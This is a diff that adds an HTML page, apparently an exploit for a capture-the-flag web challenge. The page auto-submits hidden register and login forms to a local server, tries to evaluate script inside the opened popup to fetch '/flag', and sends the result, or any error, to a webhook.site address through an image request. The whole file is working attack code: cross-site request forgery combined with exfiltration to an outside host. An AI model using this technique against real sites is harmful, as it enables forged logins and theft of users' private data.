@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<body>
+<form id="regForm" method="POST" action="http://localhost:3000/register" target="popup">
+  <input name="username" value="final1">
+  <input name="password" value="final1">
+</form>
+
+<form id="loginForm" method="POST" action="http://localhost:3000/login" target="popup">
+  <input name="username" value="final1">
+  <input name="password" value="final1">
+</form>
+
+<script>
+var popup = window.open('about:blank', 'popup');
+
+document.getElementById('regForm').submit();
+
+setTimeout(function(){
+  document.getElementById('loginForm').submit();
+}, 200);
+
+setTimeout(function(){
+  // popup 내부에서 fetch로 flag 가져와서 전송
+  var code = `
+    fetch('/flag').then(r=>r.text()).then(f=>{
+      new Image().src='https://webhook.site/showontest?flag='+encodeURIComponent(f);
+    });
+  `;
+  try {
+    popup.eval(code);
+  } catch(e) {
+    new Image().src = 'https://webhook.site/showontest?err=' + encodeURIComponent(e.message);
+  }
+}, 600);
+</script>
+</body>
+</html>
